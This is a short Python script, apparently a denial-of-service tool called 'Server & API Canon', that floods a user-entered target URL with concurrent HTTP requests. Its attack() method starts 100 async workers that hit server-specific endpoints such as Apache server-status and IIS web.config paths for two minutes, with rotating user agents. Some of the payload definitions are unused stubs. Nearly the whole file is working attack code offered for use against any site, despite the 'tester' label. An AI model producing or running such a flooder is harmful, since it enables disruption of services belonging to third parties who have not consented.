import asyncio
import aiohttp
import random
import logging
from datetime import datetime

# Setup logging
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')

class ServerAPITester:
    def __init__(self, server_type):
        self.server_type = server_type.lower()
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
        ]
        self.endpoints = self.get_endpoints()
        self.payload = self.get_payload()

    def get_endpoints(self):
        return {
            "apache": ["server-status", "cgi-bin/test.cgi"],
            "nginx": ["/status", "/static/test.html"],
            "iis": ["_vti_bin/shtml.dll", "aspnet_client/system_web/1_0_3705_0/web.config"],
            "lighttpd": ["index.php", "fastcgi-test"],
        }.get(self.server_type, [])

    def get_payload(self):
        return {
            "apache": {"keep-alive": True},
            "nginx": {"keep-alive": True},
            "iis": """<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" ...>""",
            "lighttpd": b'\x01\x01\x00\x01\x00\x08\x00\x00',
        }.get(self.server_type, None)

    def get_random_user_agent(self):
        return random.choice(self.user_agents)

    async def send_request(self, session, url, endpoint):
        full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
        headers = {
            "User-Agent": self.get_random_user_agent(),
            "Accept": "*/*"
        }
        try:
            async with session.get(full_url, headers=headers) as response:
                status = response.status
                logging.info(f"[{status}] {full_url}")
                return status, await response.text()
        except Exception as e:
            logging.error(f"[ERROR] {full_url}: {e}")
            return None, None

    async def attack(self, url, duration=60, workers=50):
        start_time = datetime.now()
        timeout = aiohttp.ClientTimeout(total=None)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async def worker():
                while (datetime.now() - start_time).total_seconds() < duration:
                    endpoint = random.choice(self.endpoints)
                    await self.send_request(session, url, endpoint)

            tasks = [worker() for _ in range(workers)]
            await asyncio.gather(*tasks)

def main():
    print("=== Server & API Canon ===")
    target_url = input("Masukan target URL (e.g., https://example.com): ").strip()
    server_type = input("Target server type (apache, nginx, iis, lighttpd): ").strip().lower()

    if not (target_url.startswith("http://") or target_url.startswith("https://")):
        logging.error("Invalid URL. Please include http:// or https://")
        return

    try:
        tester = ServerAPITester(server_type)
        asyncio.run(tester.attack(target_url, duration=120, workers=100))
    except KeyboardInterrupt:
        logging.info("Attack interrupted by user.")
    except Exception as e:
        logging.error(f"Unexpected error occurred: {e}")

if __name__ == "__main__":
    main()
